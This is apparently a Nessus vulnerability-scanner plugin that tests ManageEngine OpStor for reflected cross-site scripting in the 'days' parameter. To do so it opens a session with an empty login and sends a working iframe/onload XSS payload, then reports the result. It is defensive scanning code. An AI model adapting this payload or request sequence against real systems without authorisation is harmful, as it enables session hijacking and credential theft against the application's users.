#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62784);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2017/02/07 18:43:41 $");

  script_bugtraq_id(55070);
  script_osvdb_id(84803);

  script_name(english:"ManageEngine OpStor availability730.do days Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by a cross-site
scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote ManageEngine OpStor install is affected by a cross-site
scripting vulnerability.  The application does not properly sanitize the
'days' parameter on the 'availability730.do' script. 

A remote attacker could exploit this by tricking a user into requesting
a maliciously crafted URL.  Exploitation could also allow the attacker
to steal cookie-based authentication credentials. 

The application is also reported to be vulnerable to SQL injection
attacks as well as a cross-site scripting attack involving the 'name'
parameter of the 'availability730.do' script, although Nessus has not
checked for those issues.");
  script_set_attribute(attribute:"solution", value:"There is currently no patch available from the vendor.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);
  # http://packetstormsecurity.org/files/115636/ManageEngine-OpStor-7.4-Cross-Site-Scripting-SQL-Injection.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1a3a3ec0");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_opstor");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("manageengine_opstor_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/manageengine_opstor");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname      : "manageengine_opstor",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_loc = build_url(qs:dir,port:port);
xss = '>"<iframe src=nessus onload=alert("' + SCRIPT_NAME + '-' + unixtime() + '")></iframe>';

# Send empty login request to establish a valid session
res2 = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : dir + "/jsp/Login.do",
  data            : "userName=&password=&Submit=Log+In",
  content_type    : "application/x-www-form-urlencoded",
  exit_on_fail    : TRUE
);

post_req = http_last_sent_request();

# grab the cookie for use in our attack
cookie = get_http_cookie(name: "OPSTORSESSIONID");
url = "availability730.do?days=";

res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : dir + "/" + url + urlencode(str:xss),
  add_headers  : make_array("Cookie", "OPSTORSESSIONID=" + cookie),
  exit_on_fail : TRUE
);

pass_str = 'class="tableheader"> null - ' + xss;

if (pass_str >< res[2] && "StatisticsReport" >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  report = NULL;
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to verify the issue using the following pair of' +
      '\n' + 'requests :' +
      '\n' +
      '\n' + post_req +
      '\n' +
      '\n' + 'Note that the POST request above creates a session which is required' +
      '\n' + 'in order to exploit the vulnerability with the following URL : ' +
      '\n' +
      '\n  ' + install_loc + url + xss +
      '\n';
    if (report_verbosity > 1)
    {
      output = extract_pattern_from_resp(string:res[2], pattern:'ST:'+pass_str);
      report +=
        '\n' + 'This produced the following response :' +
        '\n' +
        '\n' + output +
        '\n';
    }
  }
  security_warning(port:port, extra:report);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine OpStor", install_loc);
